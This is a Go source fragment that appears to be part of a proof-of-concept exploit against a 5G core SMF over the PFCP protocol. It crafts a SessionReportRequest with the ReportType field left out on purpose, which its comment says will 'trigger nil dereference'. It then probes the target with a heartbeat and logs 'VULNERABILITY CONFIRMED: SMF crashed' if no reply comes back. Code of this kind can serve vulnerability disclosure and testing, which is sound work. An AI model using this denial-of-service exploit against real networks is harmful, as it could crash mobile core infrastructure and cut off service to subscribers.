func cpfSeidFromSessionEstablishment(req *message.SessionEstablishmentRequest) (uint64, *ie.FSEIDFields, bool) {
	if req == nil || req.CPFSEID == nil {
		return 0, nil, false
	}
	fseid, err := req.CPFSEID.FSEID()
	if err != nil {
		return 0, nil, false
	}
	return fseid.SEID, fseid, true
}

func nodeIDFromIE(nodeIE *ie.IE) string {
	if nodeIE == nil {
		return "unknown"
	}
	nodeID, err := nodeIE.NodeID()
	if err != nil {
		return "unknown"
	}
	return nodeID
}

func ipString(ip net.IP) string {
	if ip == nil {
		return "-"
	}
	return ip.String()
}

// buildSessionReportRequestNoReportType creates a SessionReportRequest without ReportType IE
func buildSessionReportRequestNoReportType(seid uint64, seq uint32) []byte {
	// PFCP Header for session-related message (S=1, 16 bytes)
	// Version=1, Spare=0, MP=0, S=1
	header := make([]byte, 16)
	header[0] = 0x21                              // Version=1, S=1
	header[1] = 56                                // Message Type = SessionReportRequest
	binary.BigEndian.PutUint16(header[2:4], 12)   // Message Length (header after length field = 12)
	binary.BigEndian.PutUint64(header[4:12], seid) // SEID
	header[12] = byte(seq >> 16)                  // Sequence Number
	header[13] = byte(seq >> 8)
	header[14] = byte(seq)
	header[15] = 0x00 // Spare/Priority

	// No IEs - specifically omitting ReportType to trigger nil dereference
	return header
}

func waitSessionReportResponse(conn *net.UDPConn, timeout time.Duration) (*message.SessionReportResponse, error) {
	deadline := time.Now().Add(timeout)
	buf := make([]byte, 2048)

	for {
		conn.SetReadDeadline(deadline)
		n, err := conn.Read(buf)
		if err != nil {
			return nil, err
		}

		msg, err := message.Parse(buf[:n])
		if err != nil {
			continue
		}

		if rsp, ok := msg.(*message.SessionReportResponse); ok {
			return rsp, nil
		}
	}
}

func sessionReportCause(rsp *message.SessionReportResponse) (uint8, bool) {
	if rsp == nil || rsp.Cause == nil {
		return 0, false
	}

	cause, err := rsp.Cause.Cause()
	if err != nil {
		return 0, false
	}

	return cause, true
}

func probeSmf(conn *net.UDPConn) {
	log.Printf("[*] Sending HeartbeatRequest probe...")

	req := message.NewHeartbeatRequest(
		0x1234,
		ie.NewRecoveryTimeStamp(time.Now()),
		nil,
	)
	payload, _ := req.Marshal()

	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	_, err := conn.Write(payload)
	if err != nil {
		log.Printf("[+] SMF appears to be down (write error: %v)", err)
		log.Printf("[+] VULNERABILITY CONFIRMED")
		return
	}

	buf := make([]byte, 1024)
	_, err = conn.Read(buf)
	if err != nil {
		log.Printf("[+] SMF appears to be down (no heartbeat response)")
		log.Printf("[+] VULNERABILITY CONFIRMED: SMF crashed")
	} else {
		log.Printf("[-] SMF is still responding")
		log.Printf("[-] Possible reasons:")
		log.Printf("[-]   1. SEID doesn't exist (session not found)")
		log.Printf("[-]   2. Session UpCnxState is not DEACTIVATED")
		log.Printf("[-] Check SMF logs for details")
	}
}
